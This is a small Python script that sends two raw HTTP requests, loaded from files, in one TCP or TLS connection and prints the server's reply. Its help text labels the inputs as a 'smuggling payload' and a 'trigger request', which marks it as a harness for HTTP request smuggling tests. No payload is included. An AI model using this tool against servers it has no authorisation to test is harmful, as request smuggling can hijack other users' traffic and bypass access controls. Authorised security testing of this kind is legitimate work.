import socket
import ssl
import argparse

def read_request(path):
    with open(path, 'r', encoding='utf-8') as f:
        lines = [(line.rstrip('\r\n') + '\r\n') for line in f]
    return ''.join(lines).encode('utf-8')

def send_dual_http_requests(host, port, use_ssl, req1_path, req2_path):
    try:
        req1 = read_request(req1_path)
        req2 = read_request(req2_path)
        combined = req1 + req2

        with socket.create_connection((host, port), timeout=10) as sock:
            if use_ssl:
                context = ssl.create_default_context()
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    ssock.sendall(combined)
                    return read_response(ssock)
            else:
                sock.sendall(combined)
                return read_response(sock)
    except Exception as e:
        return f"[!] Error: {e}"

def read_response(sock):
    response = b''
    sock.settimeout(5)
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    return response.decode(errors='replace')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Send 2 HTTP requests in 1 TCP connection")
    parser.add_argument("host", help="Target host")
    parser.add_argument("port", type=int, help="Target port (80/443)")
    parser.add_argument("req1", help="Request file 1 (smuggling payload)")
    parser.add_argument("req2", help="Request file 2 (trigger request)")
    parser.add_argument("--ssl", action="store_true", help="Use HTTPS")

    args = parser.parse_args()
    print("[*] Sending combined requests...")
    response = send_dual_http_requests(args.host, args.port, args.ssl, args.req1, args.req2)
    print("[*] Response received:\n")
    print(response)
